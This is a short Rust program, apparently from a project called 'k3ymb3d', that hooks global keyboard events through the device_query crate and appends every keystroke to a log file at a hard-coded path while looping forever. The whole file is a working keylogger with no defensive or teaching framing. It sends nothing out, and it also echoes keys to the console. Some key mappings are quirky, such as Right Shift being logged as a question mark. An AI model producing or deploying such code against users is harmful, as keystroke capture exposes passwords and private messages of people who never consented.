use std::fs::OpenOptions;
use std::io::Write;
use device_query::{ DeviceState, DeviceEvents };

fn main() {

    let device_state = DeviceState::new();


    let _guard = device_state.on_key_down(move |key| {
        println!("Down: {:#?}", key);


        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open("/home/oef/Documents/Github/k3ymb3d/log.txt")
            .expect("Failed to open file");
        // check if key is "Space" keycode type
        // using match expression
        match *key {
            device_query::Keycode::Space => {
                // write to file
                file.write(b" ").expect("Failed to write to file");
            }
            device_query::Keycode::Enter => {
                // write to file
                file.write(b"'\n").expect("Failed to write to file");
            }
            device_query::Keycode::RShift | device_query::Keycode::Slash => {
                // write to file
                file.write(b"?").expect("Failed to write to file");
            }
            _ => { 
                write!(file, "{}",  key).expect("Failed to write to file");  
            }
        }
        
        
        /*if *key == device_query::Keycode::Space {
            // write to file
            file.write_all(b" ").expect("Failed to write to file");
        }
        else {
            write!(file, "{}",  key).expect("Failed to write to file");    
        }*/
    });
        
    loop {}
}



